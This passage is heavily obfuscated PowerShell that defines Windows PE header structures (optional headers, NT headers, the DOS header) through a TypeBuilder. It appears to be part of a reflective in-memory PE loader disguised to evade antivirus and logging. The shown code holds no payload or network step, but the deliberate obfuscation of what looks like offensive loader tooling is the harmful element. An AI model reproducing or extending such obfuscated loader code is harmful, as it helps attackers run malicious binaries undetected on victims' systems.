		(${typEB`Uil`dER}.("{2}{0}{3}{1}" -f 'ie','d','DefineF','l').Invoke(("{3}{1}{0}{2}{4}"-f'kCom','fStac','m','SizeO','it'), [UInt64], ("{0}{2}{1}"-f'Pub','c','li'))).("{2}{1}{0}"-f 'et','fs','SetOf').Invoke(80) | &("{0}{2}{1}"-f'O','ull','ut-N')
		(${TYp`E`BUILDer}.("{2}{1}{0}" -f 'Field','efine','D').Invoke(("{1}{0}{3}{2}" -f'zeOfHeapR','Si','serve','e'), [UInt64], ("{0}{1}"-f'P','ublic'))).("{1}{2}{0}" -f 'set','Se','tOff').Invoke(88) | &("{1}{0}{2}" -f'ut-Nu','O','ll')
		(${TY`pEBu`ilDER}.("{1}{2}{0}" -f 'd','DefineFi','el').Invoke(("{1}{0}{2}"-f'mm','SizeOfHeapCo','it'), [UInt64], ("{2}{0}{1}"-f'ubli','c','P'))).("{0}{2}{1}"-f'Set','t','Offse').Invoke(96) | &("{1}{0}{2}"-f 'u','O','t-Null')
		(${TYP`eB`UILDER}.("{2}{0}{1}"-f'eFie','ld','Defin').Invoke(("{0}{2}{1}" -f 'Lo','erFlags','ad'), [UInt32], ("{0}{1}" -f 'P','ublic'))).("{0}{2}{1}"-f'Set','set','Off').Invoke(104) | &("{0}{2}{1}" -f 'Out','Null','-')
		(${tY`PE`BU`ILDeR}.("{0}{1}{2}" -f'DefineF','i','eld').Invoke(("{3}{0}{1}{2}"-f 'dS','ize','s','NumberOfRvaAn'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{0}{2}{1}"-f'SetOffs','t','e').Invoke(108) | &("{1}{0}{2}"-f'ut','O','-Null')
		(${TYp`ebu`il`DEr}.("{0}{2}{1}"-f'DefineF','ld','ie').Invoke(("{2}{0}{1}"-f 'tTab','le','Expor'), ${IMAgE_d`AtA_`dIRE`Ct`O`RY}, ("{1}{2}{0}"-f 'c','P','ubli'))).("{0}{1}{2}"-f 'S','et','Offset').Invoke(112) | &("{2}{0}{1}"-f 'N','ull','Out-')
		(${TypE`BUiLd`ER}.("{2}{0}{1}" -f 'Fiel','d','Define').Invoke(("{3}{1}{0}{2}"-f 'l','Tab','e','Import'), ${imA`gE_daTA`_`DIRE`cT`O`Ry}, ("{0}{1}" -f'Pu','blic'))).("{0}{1}"-f'Set','Offset').Invoke(120) | &("{1}{0}{2}" -f 'N','Out-','ull')
		(${Ty`PebuIL`d`ER}.("{1}{2}{0}" -f 'd','DefineFi','el').Invoke(("{3}{0}{2}{1}" -f'sourceTa','e','bl','Re'), ${ImAGE_d`Ata_`dIr`E`Ct`oRy}, ("{0}{1}"-f 'Pub','lic'))).("{0}{2}{1}" -f'Set','fset','Of').Invoke(128) | &("{1}{0}{2}" -f'ut','O','-Null')
		(${TypE`BuiLd`Er}.("{3}{0}{2}{1}" -f'f','Field','ine','De').Invoke(("{2}{3}{1}{4}{0}"-f 'e','nTa','Exc','eptio','bl'), ${IMag`E`_DaTA`_`diRECtORy}, ("{1}{0}" -f 'blic','Pu'))).("{2}{0}{1}"-f'tOffs','et','Se').Invoke(136) | &("{0}{1}{2}" -f'Out-','Nul','l')
		(${ty`PE`BUild`eR}.("{3}{1}{0}{2}"-f'el','Fi','d','Define').Invoke(("{2}{0}{3}{1}{4}" -f 'f','teTab','Certi','ica','le'), ${IM`A`ge`_`DatA_DirectOry}, ("{1}{0}" -f'lic','Pub'))).("{0}{2}{1}" -f'SetOf','et','fs').Invoke(144) | &("{2}{0}{1}" -f'Nu','ll','Out-')
		(${tYP`ebu`iL`DEr}.("{1}{0}{2}" -f'neFi','Defi','eld').Invoke(("{6}{4}{2}{5}{3}{1}{0}" -f'e','l','e','cationTab','s','Relo','Ba'), ${Im`A`Ge_`data`_dI`RectoRy}, ("{0}{1}{2}"-f 'Pu','bli','c'))).("{1}{0}" -f 'fset','SetOf').Invoke(152) | &("{2}{1}{0}" -f'l','t-Nul','Ou')
		(${Typ`e`BUILDeR}.("{0}{2}{3}{1}"-f 'D','neField','ef','i').Invoke(("{0}{1}"-f 'D','ebug'), ${Ima`GE`_DAta_diREC`To`Ry}, ("{1}{0}"-f 'c','Publi'))).("{2}{3}{1}{0}"-f'ffset','O','S','et').Invoke(160) | &("{2}{0}{1}"-f 't-Nu','ll','Ou')
		(${T`yp`eBuILd`ER}.("{3}{1}{2}{0}"-f 'd','efin','eFiel','D').Invoke(("{0}{3}{2}{1}" -f'Ar','e','itectur','ch'), ${I`M`AGE`_d`A`TA_di`RecToRY}, ("{0}{1}" -f'P','ublic'))).("{0}{1}{2}"-f'SetOf','fs','et').Invoke(168) | &("{0}{1}"-f 'Out-','Null')
		(${TyPeb`U`I`ldeR}.("{2}{0}{1}" -f'efin','eField','D').Invoke(("{0}{1}{2}"-f 'Glob','a','lPtr'), ${I`mA`GE`_da`TA_`dIrecTo`Ry}, ("{1}{0}{2}"-f 'li','Pub','c'))).("{0}{1}{2}"-f 'Se','tO','ffset').Invoke(176) | &("{0}{2}{1}"-f 'O','ll','ut-Nu')
		(${TY`pEBuILd`eR}.("{0}{1}{2}{3}"-f 'Def','in','eF','ield').Invoke(("{1}{0}{2}" -f'bl','TLSTa','e'), ${i`mAge_dat`A_DirE`ctO`Ry}, ("{0}{1}" -f'Publ','ic'))).("{1}{0}{2}"-f 'fs','SetOf','et').Invoke(184) | &("{0}{1}"-f'Out','-Null')
		(${tyPeBU`ILd`ER}.("{1}{0}{2}"-f 'Fi','Define','eld').Invoke(("{4}{0}{1}{3}{2}"-f 'onfig','Ta','le','b','LoadC'), ${IMagE`_Data`_diR`e`CTOrY}, ("{2}{1}{0}" -f 'lic','ub','P'))).("{0}{2}{1}" -f 'Se','t','tOffse').Invoke(192) | &("{1}{0}"-f'ut-Null','O')
		(${TY`pEB`UIlD`eR}.("{1}{0}{2}"-f'i','Def','neField').Invoke(("{0}{2}{1}{3}" -f'Bo','dI','un','mport'), ${im`AgE_DAT`A`_dIR`ECTorY}, ("{0}{1}"-f'Publ','ic'))).("{1}{0}" -f 't','SetOffse').Invoke(200) | &("{2}{1}{0}" -f'Null','-','Out')
		(${TY`p`eBu`iLDER}.("{0}{2}{1}" -f 'D','d','efineFiel').Invoke('IAT', ${imaGe`_datA`_Di`R`EcTORy}, ("{1}{0}"-f 'ic','Publ'))).("{1}{3}{0}{2}"-f 'f','Se','fset','tO').Invoke(208) | &("{2}{1}{0}" -f 'Null','-','Out')
		(${tYP`e`BU`ILdER}.("{1}{2}{0}" -f'ield','Defin','eF').Invoke(("{0}{2}{1}{3}"-f'Del','ortDes','ayImp','criptor'), ${IM`A`Ge_dATA_DiReC`T`o`Ry}, ("{2}{0}{1}"-f 'i','c','Publ'))).("{2}{0}{1}" -f'et','Offset','S').Invoke(216) | &("{0}{1}"-f 'O','ut-Null')
		(${T`ypE`BUilDeR}.("{0}{3}{1}{2}"-f 'De','neFie','ld','fi').Invoke(("{1}{0}{2}{4}{3}"-f'L','C','RRu','meHeader','nti'), ${ima`g`e_d`ATa`_d`ire`cTorY}, ("{1}{0}"-f'c','Publi'))).("{0}{1}"-f 'S','etOffset').Invoke(224) | &("{0}{1}" -f'Ou','t-Null')
		(${Ty`PEB`Uild`ER}.("{2}{1}{0}"-f'Field','ne','Defi').Invoke(("{0}{1}{2}" -f 'Res','erve','d'), ${Im`A`gE_DaTA_dIR`ecto`RY}, ("{1}{0}" -f'ic','Publ'))).("{2}{0}{1}" -f 'etOffs','et','S').Invoke(232) | &("{0}{1}{2}"-f 'Out-N','u','ll')
		${iMAgE_OpTioN`Al`_`H`eaDER64} = ${tYPEBu`Il`DEr}.("{1}{3}{0}{2}"-f 'teTy','Cre','pe','a').Invoke()
		${Win`32Ty`PEs} | &("{2}{1}{0}"-f'mber','e','Add-M') -MemberType ("{2}{1}{0}" -f 'perty','o','NotePr') -Name ("{3}{2}{6}{4}{1}{7}{5}{0}"-f'64','NAL_H','A','IM','O','ADER','GE_OPTI','E') -Value ${iMAgE_o`Pt`IOn`A`l`_H`EADEr64}

		
		${a`TtrI`BuT`Es} = ("{6}{9}{5}{8}{3}{15}{7}{11}{16}{2}{10}{14}{4}{0}{1}{13}{12}" -f 'ayout, Sealed, Befor','eF',' Clas','ut, A','icitL','y','AutoL','iClas','o','a','s,','s','dInit','iel',' Public, Expl','ns',',')
		${TyPE`BuILd`Er} = ${mod`ULEB`Ui`LDER}.("{1}{2}{0}" -f 'neType','De','fi').Invoke(("{5}{3}{4}{2}{1}{0}"-f'32','R','PTIONAL_HEADE','E','_O','IMAG'), ${aTt`R`iBUtes}, [System.ValueType], 224)
		(${T`Y`peb`UILdEr}.("{0}{1}{2}" -f'Define','Fie','ld').Invoke(("{0}{1}"-f 'Mag','ic'), ${Ma`giC`T`yPe}, ("{0}{1}" -f'Pu','blic'))).("{2}{1}{0}" -f 'ffset','tO','Se').Invoke(0) | &("{2}{0}{1}"-f'N','ull','Out-')
		(${t`Ypeb`UildER}.("{1}{0}{2}"-f 'fineF','De','ield').Invoke(("{2}{1}{3}{0}" -f'ersion','jorL','Ma','inkerV'), [Byte], ("{1}{2}{0}"-f 'ic','P','ubl'))).("{0}{1}{2}"-f 'SetO','f','fset').Invoke(2) | &("{1}{0}{2}" -f 'ut-','O','Null')
		(${tY`Pe`BUiLDER}.("{2}{1}{3}{0}" -f 'eld','e','Defin','Fi').Invoke(("{5}{4}{3}{0}{2}{1}" -f 's','on','i','er','orLinkerV','Min'), [Byte], ("{1}{0}" -f'ic','Publ'))).("{0}{2}{1}"-f'Se','t','tOffse').Invoke(3) | &("{2}{0}{1}" -f 'ut-','Null','O')
		(${TY`pebUIl`d`Er}.("{0}{2}{1}" -f 'DefineFie','d','l').Invoke(("{1}{0}{2}"-f'OfCo','Size','de'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{2}{0}{1}"-f'tOffs','et','Se').Invoke(4) | &("{0}{1}" -f'Out-','Null')
		(${TYpE`BUI`Lder}.("{1}{0}{2}" -f 'e','DefineFi','ld').Invoke(("{0}{3}{2}{4}{1}" -f'Siz','ta','fInitial','eO','izedDa'), [UInt32], ("{1}{2}{0}"-f 'lic','Pu','b'))).("{2}{0}{1}" -f 'etOff','set','S').Invoke(8) | &("{2}{1}{0}"-f'l','ut-Nul','O')
		(${TypEbu`il`der}.("{1}{0}{2}" -f 'Fiel','Define','d').Invoke(("{4}{1}{0}{3}{2}"-f'Uninitializ','eOf','a','edDat','Siz'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{0}{1}" -f 'SetOff','set').Invoke(12) | &("{2}{0}{1}"-f'N','ull','Out-')
		(${TypE`B`UIlD`Er}.("{3}{0}{1}{2}" -f 'e','fineFie','ld','D').Invoke(("{1}{3}{4}{0}{5}{2}"-f'Po','Add','t','ress','OfEntry','in'), [UInt32], ("{0}{1}"-f 'P','ublic'))).("{1}{2}{0}" -f'set','Set','Off').Invoke(16) | &("{1}{2}{0}" -f 'ull','Ou','t-N')
		(${t`YP`EBU`IldEr}.("{0}{2}{1}" -f 'Define','ld','Fie').Invoke(("{1}{0}{2}" -f'aseOfC','B','ode'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{2}{3}{0}{1}"-f 'Offse','t','Se','t').Invoke(20) | &("{1}{2}{0}"-f 'l','Ou','t-Nul')
		(${tY`Pe`Bui`LdER}.("{0}{1}{3}{2}"-f'D','e','ield','fineF').Invoke(("{0}{3}{1}{2}"-f 'Ba','fDat','a','seO'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{1}{0}{2}" -f 'etOf','S','fset').Invoke(24) | &("{0}{2}{1}"-f 'Out-','l','Nul')
		(${tyPeb`Uil`DER}.("{2}{1}{0}"-f'ld','e','DefineFi').Invoke(("{2}{0}{1}"-f'mageBa','se','I'), [UInt32], ("{0}{1}"-f 'Publi','c'))).("{0}{2}{1}" -f 'Se','Offset','t').Invoke(28) | &("{1}{2}{0}" -f'ull','Out','-N')
		(${TYPEb`UILD`er}.("{3}{1}{2}{0}" -f 'eField','e','fin','D').Invoke(("{3}{0}{1}{2}{4}" -f 'o','nAlign','m','Secti','ent'), [UInt32], ("{1}{0}" -f'blic','Pu'))).("{1}{2}{3}{0}" -f't','Se','tOffs','e').Invoke(32) | &("{2}{1}{0}" -f 'l','-Nul','Out')
		(${TY`pEbuI`Lder}.("{1}{0}{3}{2}"-f'f','De','eld','ineFi').Invoke(("{0}{1}{2}" -f 'F','ileAlignmen','t'), [UInt32], ("{0}{1}" -f'Pub','lic'))).("{1}{0}{2}"-f 'Off','Set','set').Invoke(36) | &("{1}{0}" -f 'Null','Out-')
		(${t`ypebu`IlD`ER}.("{0}{3}{2}{1}"-f'D','d','el','efineFi').Invoke(("{2}{3}{1}{4}{0}"-f 'ion','ingSystemVe','MajorO','perat','rs'), [UInt16], ("{1}{0}"-f'c','Publi'))).("{2}{1}{0}" -f 'Offset','t','Se').Invoke(40) | &("{1}{0}"-f 'l','Out-Nul')
		(${TYpEB`UIld`eR}.("{1}{2}{3}{0}" -f 'neField','D','ef','i').Invoke(("{5}{3}{2}{4}{0}{6}{1}" -f'e','on','gSyste','eratin','mV','MinorOp','rsi'), [UInt16], ("{1}{0}" -f'lic','Pub'))).("{2}{1}{0}" -f 'set','ff','SetO').Invoke(42) | &("{0}{2}{1}"-f 'Out-Nu','l','l')
		(${t`YpEbUi`LdER}.("{0}{1}{2}"-f 'Defin','e','Field').Invoke(("{1}{0}{3}{2}" -f'orIm','Maj','eVersion','ag'), [UInt16], ("{2}{1}{0}"-f 'c','bli','Pu'))).("{3}{2}{0}{1}"-f 'f','fset','tO','Se').Invoke(44) | &("{2}{1}{0}" -f 'l','l','Out-Nu')
		(${ty`peBu`IlDeR}.("{2}{3}{1}{0}" -f 'Field','e','De','fin').Invoke(("{1}{5}{4}{0}{3}{2}" -f 'Im','Mi','rsion','ageVe','or','n'), [UInt16], ("{1}{0}" -f 'c','Publi'))).("{0}{1}{3}{2}" -f'S','etOf','set','f').Invoke(46) | &("{0}{1}{2}"-f'O','ut-Nu','ll')
		(${TypeBuI`l`d`eR}.("{2}{3}{0}{1}"-f 'in','eField','D','ef').Invoke(("{5}{1}{3}{0}{4}{2}"-f'mV','y','n','ste','ersio','MajorSubs'), [UInt16], ("{0}{1}" -f 'Publi','c'))).("{2}{1}{0}" -f 'et','fs','SetOf').Invoke(48) | &("{1}{0}{2}"-f'ut-N','O','ull')
		(${TY`p`eBUiLD`Er}.("{0}{1}{2}"-f'Defin','eFie','ld').Invoke(("{3}{4}{2}{1}{0}" -f'emVersion','t','s','MinorSu','bsy'), [UInt16], ("{1}{0}"-f'c','Publi'))).("{2}{0}{1}"-f 'f','set','SetOf').Invoke(50) | &("{2}{0}{1}" -f'ut-','Null','O')
		(${T`yPe`BUi`lDeR}.("{0}{3}{1}{2}" -f 'D','fi','neField','e').Invoke(("{2}{0}{3}{1}" -f'32Ver','alue','Win','sionV'), [UInt32], ("{0}{1}{2}"-f 'P','ubl','ic'))).("{0}{1}{2}" -f 'Set','Offse','t').Invoke(52) | &("{0}{1}{2}"-f'Out-N','u','ll')
		(${tYp`e`BuiLD`ER}.("{0}{3}{1}{2}" -f'Define','el','d','Fi').Invoke(("{0}{1}{2}" -f'Si','zeOfImag','e'), [UInt32], ("{0}{1}" -f'Pu','blic'))).("{2}{0}{1}"-f 'etOff','set','S').Invoke(56) | &("{0}{1}" -f 'Out-N','ull')
		(${t`yPebU`IlDer}.("{1}{0}{2}" -f 'f','De','ineField').Invoke(("{1}{3}{2}{0}" -f'ers','S','ead','izeOfH'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{0}{1}" -f'SetOffs','et').Invoke(60) | &("{0}{1}{2}"-f'O','ut-','Null')
		(${TY`peb`UI`ldER}.("{2}{1}{0}"-f 'Field','e','Defin').Invoke(("{0}{1}{2}" -f 'Che','c','kSum'), [UInt32], ("{1}{0}" -f'c','Publi'))).("{0}{2}{1}" -f'Set','fset','Of').Invoke(64) | &("{1}{0}{2}" -f'ut-','O','Null')
		(${TY`pEbUi`ldEr}.("{2}{3}{0}{1}" -f'neFiel','d','Def','i').Invoke(("{2}{0}{1}"-f 'ubsyste','m','S'), ${s`UbSySteMT`Y`Pe}, ("{1}{2}{0}" -f 'c','Pu','bli'))).("{1}{0}"-f'fset','SetOf').Invoke(68) | &("{1}{0}{2}"-f 'ul','Out-N','l')
		(${TYP`EbUI`l`DEr}.("{1}{2}{0}{3}"-f 'eFie','D','efin','ld').Invoke(("{1}{3}{0}{2}" -f'e','DllChar','ristics','act'), ${dL`lchar`ACte`RiStiCSTY`PE}, ("{0}{1}"-f'Pu','blic'))).("{1}{0}{2}{3}" -f'e','S','tO','ffset').Invoke(70) | &("{1}{2}{0}"-f 'ull','O','ut-N')
		(${Typ`EbUi`lD`ER}.("{1}{2}{3}{0}"-f'eld','Define','F','i').Invoke(("{0}{1}{3}{2}{4}" -f 'S','ize','t','OfS','ackReserve'), [UInt32], ("{0}{1}"-f'Publ','ic'))).("{2}{1}{0}" -f 'et','fs','SetOf').Invoke(72) | &("{2}{0}{1}"-f 'ul','l','Out-N')
		(${tY`pEbUIL`DEr}.("{2}{0}{1}" -f'e','Field','Defin').Invoke(("{3}{2}{1}{0}{4}"-f 'ackCom','fSt','O','Size','mit'), [UInt32], ("{0}{1}"-f 'Publ','ic'))).("{2}{1}{0}" -f'et','s','SetOff').Invoke(76) | &("{1}{0}{2}"-f'ut-Nu','O','ll')
		(${TYp`EbUiL`D`ER}.("{1}{0}{2}"-f'ineF','Def','ield').Invoke(("{3}{0}{4}{2}{1}" -f 'eOf','pReserve','ea','Siz','H'), [UInt32], ("{0}{1}" -f'Publ','ic'))).("{1}{2}{0}" -f 'et','Set','Offs').Invoke(80) | &("{0}{1}{2}"-f 'Ou','t-N','ull')
		(${ty`PEBUIL`DeR}.("{2}{0}{1}" -f 'eFie','ld','Defin').Invoke(("{3}{0}{2}{1}" -f 'fHeapCo','mit','m','SizeO'), [UInt32], ("{0}{2}{1}" -f'P','lic','ub'))).("{1}{2}{0}{3}" -f'Offse','Se','t','t').Invoke(84) | &("{1}{2}{0}"-f 'l','O','ut-Nul')
		(${Ty`peb`UilDER}.("{2}{1}{0}" -f 'd','iel','DefineF').Invoke(("{2}{0}{1}"-f'oaderFla','gs','L'), [UInt32], ("{0}{1}"-f'Pub','lic'))).("{0}{2}{1}" -f'S','Offset','et').Invoke(88) | &("{0}{1}"-f 'Ou','t-Null')
		(${tyPEb`U`iL`DeR}.("{1}{2}{0}" -f'ineField','De','f').Invoke(("{3}{2}{0}{1}"-f 'rOfRvaAndSiz','es','e','Numb'), [UInt32], ("{0}{2}{1}"-f 'P','c','ubli'))).("{0}{1}{2}"-f'SetO','f','fset').Invoke(92) | &("{2}{0}{1}" -f 't-Nu','ll','Ou')
		(${t`Y`PEb`UIlder}.("{0}{1}{2}" -f'D','e','fineField').Invoke(("{0}{2}{1}" -f 'Exp','tTable','or'), ${I`MAge_dAta_di`Rec`ToRy}, ("{1}{0}"-f 'ic','Publ'))).("{2}{0}{1}" -f't','Offset','Se').Invoke(96) | &("{2}{0}{1}" -f 'u','t-Null','O')
		(${Typebu`Il`D`er}.("{3}{1}{0}{2}" -f 'ie','F','ld','Define').Invoke(("{3}{0}{1}{2}"-f 'po','r','tTable','Im'), ${imAge`_dA`Ta_DIRe`c`ToRy}, ("{1}{0}"-f 'ublic','P'))).("{0}{1}"-f 'SetOffs','et').Invoke(104) | &("{2}{1}{0}"-f'Null','-','Out')
		(${t`YPEBUI`Ld`eR}.("{1}{0}{2}{3}"-f'fineF','De','iel','d').Invoke(("{2}{1}{0}" -f'le','esourceTab','R'), ${i`Ma`G`e_dAta_diREC`T`oRy}, ("{2}{1}{0}"-f 'c','li','Pub'))).("{0}{1}"-f'S','etOffset').Invoke(112) | &("{2}{0}{1}"-f 'ut-Nu','ll','O')
		(${t`YPeB`UIL`DeR}.("{1}{2}{3}{0}"-f 'ield','D','efine','F').Invoke(("{2}{1}{3}{0}" -f'le','ception','Ex','Tab'), ${ImagE_data_`D`irEC`ToRy}, ("{2}{0}{1}" -f'bl','ic','Pu'))).("{1}{2}{0}"-f't','Se','tOffse').Invoke(120) | &("{0}{1}{2}"-f 'Ou','t-Nu','ll')
		(${t`yp`EbUiLd`ER}.("{2}{0}{1}{3}" -f'n','e','Defi','Field').Invoke(("{0}{3}{1}{5}{4}{2}"-f'Ce','fi','le','rti','Tab','cate'), ${iM`AGe_DA`T`A_`Dir`EcToRy}, ("{2}{0}{1}" -f 'ubl','ic','P'))).("{1}{0}" -f'tOffset','Se').Invoke(128) | &("{0}{1}"-f'Out-','Null')
		(${Typ`EB`U`ilder}.("{0}{1}{3}{2}" -f 'De','fi','eField','n').Invoke(("{1}{2}{0}{3}" -f'ionT','Bas','eRelocat','able'), ${ima`GE_Da`Ta_di`R`ECToRy}, ("{0}{1}" -f 'Pu','blic'))).("{1}{0}{2}"-f'etOffse','S','t').Invoke(136) | &("{2}{1}{0}"-f'l','Nul','Out-')
		(${TYpEbU`Ild`er}.("{2}{0}{1}"-f 'neFie','ld','Defi').Invoke(("{1}{0}"-f'ug','Deb'), ${ImA`Ge_DAta_Dir`eCTO`Ry}, ("{1}{2}{0}"-f 'c','P','ubli'))).("{1}{0}"-f 'ffset','SetO').Invoke(144) | &("{2}{0}{1}" -f 'u','ll','Out-N')
		(${tyPe`Bu`iLd`er}.("{1}{3}{0}{2}"-f 'e','Def','ld','ineFi').Invoke(("{2}{3}{0}{1}"-f 't','ure','A','rchitec'), ${Im`A`Ge_`DAtA_diREc`TOrY}, ("{0}{1}"-f 'Publ','ic'))).("{0}{2}{1}" -f'Set','fset','Of').Invoke(152) | &("{1}{2}{0}"-f 'Null','O','ut-')
		(${Ty`p`eBui`Lder}.("{2}{3}{1}{0}"-f'Field','ine','D','ef').Invoke(("{2}{0}{1}"-f 'b','alPtr','Glo'), ${IMaG`e_dAta_`DIR`eCtO`Ry}, ("{2}{0}{1}" -f'ubli','c','P'))).("{0}{1}{2}"-f'S','e','tOffset').Invoke(160) | &("{0}{1}{2}" -f 'Out-N','ul','l')
		(${Type`Bui`l`deR}.("{1}{0}{2}" -f'fineF','De','ield').Invoke(("{1}{0}{2}" -f'LSTab','T','le'), ${I`M`AGE_DAta_Di`RE`Ct`o`Ry}, ("{0}{1}"-f 'P','ublic'))).("{2}{1}{0}" -f 'set','f','SetOf').Invoke(168) | &("{2}{0}{1}" -f'ut','-Null','O')
		(${tYpEBu`ild`ER}.("{0}{3}{2}{1}" -f 'Def','Field','e','in').Invoke(("{0}{1}{2}{3}" -f'Load','Config','Ta','ble'), ${I`maGe_`da`TA`_dIR`EC`TorY}, ("{0}{1}" -f'P','ublic'))).("{1}{2}{0}" -f'fset','Set','Of').Invoke(176) | &("{2}{0}{1}"-f 't-','Null','Ou')
		(${T`ypeB`UILDeR}.("{0}{1}{2}" -f'Defi','ne','Field').Invoke(("{0}{2}{1}"-f'Bou','ort','ndImp'), ${imAge_Dat`A_diRe`C`TOry}, ("{0}{1}"-f'Pu','blic'))).("{1}{2}{0}" -f'Offset','S','et').Invoke(184) | &("{0}{1}"-f'Out-Nul','l')
		(${t`yP`ebUilDEr}.("{3}{2}{1}{0}"-f'ld','neFie','fi','De').Invoke('IAT', ${im`A`gE_daTA_Di`R`eCt`orY}, ("{2}{0}{1}" -f'bli','c','Pu'))).("{0}{3}{1}{2}"-f'Se','Of','fset','t').Invoke(192) | &("{2}{0}{1}"-f 'l','l','Out-Nu')
		(${t`yPe`BuILdEr}.("{2}{3}{1}{0}" -f 'eld','i','Define','F').Invoke(("{3}{1}{4}{0}{2}"-f'mportDesc','y','riptor','Dela','I'), ${imAge_`dATA_`DiREC`T`ORY}, ("{0}{1}"-f 'Pub','lic'))).("{0}{1}" -f'SetOf','fset').Invoke(200) | &("{1}{0}{2}" -f 'N','Out-','ull')
		(${tYP`Eb`UilDeR}.("{0}{2}{1}" -f 'D','eld','efineFi').Invoke(("{4}{2}{1}{0}{3}" -f 'imeHeade','t','n','r','CLRRu'), ${IM`AGe_Da`Ta_`dIR`E`cTory}, ("{1}{0}"-f'ic','Publ'))).("{0}{1}{2}"-f 'SetO','f','fset').Invoke(208) | &("{0}{1}"-f'Out-N','ull')
		(${TY`PEBUil`DEr}.("{1}{2}{0}" -f'fineField','D','e').Invoke(("{0}{1}{2}"-f'R','es','erved'), ${IMAgE`_`DATa_D`I`REC`T`ory}, ("{1}{0}" -f'c','Publi'))).("{1}{0}{2}{3}"-f 'tO','Se','f','fset').Invoke(216) | &("{2}{1}{0}"-f 'll','t-Nu','Ou')
		${Ima`g`E_`opTiONaL_HEaDE`R32} = ${TYpe`B`UIl`DEr}.("{0}{2}{1}"-f'Crea','eType','t').Invoke()
		${w`iN3`2tYpes} | &("{0}{2}{1}"-f 'Add','mber','-Me') -MemberType ("{0}{2}{1}{3}" -f 'No','ope','tePr','rty') -Name ("{3}{2}{4}{0}{1}" -f'EADER3','2','T','IMAGE_OP','IONAL_H') -Value ${IMaG`E`_o`PTIon`A`L_hEaDer32}

		
		${aTT`RIB`Utes} = ("{21}{9}{8}{18}{1}{3}{10}{11}{17}{0}{22}{2}{6}{19}{14}{23}{7}{12}{15}{4}{20}{16}{5}{13}" -f'ss','Ans',' ','iCl','efo','dIn','Publ',', Sealed,','y','toLa','as','s, Cl',' ','it','entialLayo','B','eFiel','a','out, ','ic, Sequ','r','Au',',','ut')
		${tY`PebuIl`d`eR} = ${m`o`dUleBUIlD`eR}.("{1}{2}{0}"-f 'pe','DefineT','y').Invoke(("{3}{2}{0}{1}" -f '_HEADER','S64','AGE_NT','IM'), ${at`Tr`I`BUTeS}, [System.ValueType], 264)
		${t`Y`p`eBuiLDeR}.("{3}{0}{1}{2}" -f 'fineF','ie','ld','De').Invoke(("{1}{2}{0}" -f 'e','S','ignatur'), [UInt32], ("{1}{2}{0}" -f 'lic','Pu','b')) | &("{0}{1}{2}"-f 'O','ut','-Null')
		${tY`pEB`UIld`eR}.("{2}{3}{0}{1}"-f'ine','Field','D','ef').Invoke(("{0}{2}{1}"-f'F','leHeader','i'), ${i`Ma`G`E_f`ILE_H`EAdeR}, ("{0}{2}{1}" -f'Pub','ic','l')) | &("{1}{0}{2}" -f't-Nul','Ou','l')
		${t`ypEBUI`ld`er}.("{3}{1}{0}{2}"-f'neF','efi','ield','D').Invoke(("{4}{2}{1}{3}{0}"-f 'eader','onal','i','H','Opt'), ${i`MAg`E_op`TioNal_HEaD`Er`64}, ("{0}{1}" -f'Publ','ic')) | &("{0}{1}{2}"-f 'O','ut-N','ull')
		${i`ma`GE_nt_heA`Der`s`64} = ${T`y`PeBUILD`ER}.("{0}{1}{2}" -f 'C','re','ateType').Invoke()
		${wi`N32TY`p`Es} | &("{1}{0}{2}"-f 'd-Me','Ad','mber') -MemberType ("{0}{2}{1}{3}"-f 'N','o','otePr','perty') -Name ("{0}{3}{2}{5}{4}{1}"-f'IMAG','RS64','E','E_NT_H','E','AD') -Value ${IMA`Ge_N`T_heaDe`RS64}
		
		
		${At`Trib`U`TEs} = ("{19}{5}{12}{18}{2}{6}{4}{17}{14}{9}{10}{15}{16}{0}{7}{3}{11}{8}{1}{13}" -f'lLay','n',' Ansi','Sealed, ','la','to','C','out, ','ldI','Public,',' Seq','BeforeFie','L','it',', ','u','entia','ss, Class','ayout,','Au')
		${TyPe`BUiLd`Er} = ${moDu`lEbU`ilDER}.("{1}{0}{2}{3}"-f 'e','D','fi','neType').Invoke(("{0}{3}{2}{1}{5}{4}" -f 'IMA','RS','NT_HEADE','GE_','2','3'), ${at`TrI`BU`Tes}, [System.ValueType], 248)
		${T`yp`E`BUilder}.("{2}{0}{1}" -f 'fi','neField','De').Invoke(("{1}{2}{0}"-f're','Sig','natu'), [UInt32], ("{0}{1}{2}"-f 'P','u','blic')) | &("{0}{2}{1}"-f'Out-N','ll','u')
		${tYp`ebu`IL`deR}.("{0}{2}{1}" -f 'Def','Field','ine').Invoke(("{1}{2}{0}" -f 'ader','FileH','e'), ${i`mAG`E_f`iLE_HE`AdEr}, ("{1}{2}{0}"-f 'blic','P','u')) | &("{2}{1}{0}"-f'ull','t-N','Ou')
		${TY`pEB`UilDeR}.("{1}{0}{2}"-f 'neFi','Defi','eld').Invoke(("{3}{0}{1}{4}{2}" -f 'alHea','d','r','Option','e'), ${I`m`AGe_`OPTIoNAl`_hE`Ad`Er32}, ("{1}{0}" -f'ic','Publ')) | &("{0}{2}{1}"-f 'Out-Nu','l','l')
		${I`mAG`e_nt_`HEaDers32} = ${tYPE`BuIL`dEr}.("{1}{0}{2}"-f'eTyp','Creat','e').Invoke()
		${wi`N3`2ty`PEs} | &("{0}{1}{2}"-f 'Ad','d','-Member') -MemberType ("{1}{0}{3}{2}" -f 'e','Not','ty','Proper') -Name ("{3}{0}{2}{4}{1}"-f 'NT_','2','HEA','IMAGE_','DERS3') -Value ${Ima`Ge_n`T_He`Ad`eRS`32}

		
		${AT`Tr`ib`UtES} = ("{1}{20}{2}{19}{12}{6}{7}{11}{4}{15}{13}{3}{18}{10}{8}{21}{16}{0}{5}{14}{9}{17}"-f'ed','Auto','ut, A','quen','s',', BeforeF',', C','l','t, S','e','Layou','as','Class',' Public, Se','i',',','l','ldInit','tial','nsi','Layo','ea')
		${tyP`e`BuI`lDER} = ${MODUleBU`IL`der}.("{0}{2}{1}"-f 'De','neType','fi').Invoke(("{2}{1}{0}"-f 'ER','D','IMAGE_DOS_HEA'), ${a`Ttr`iBu`TeS}, [System.ValueType], 64)
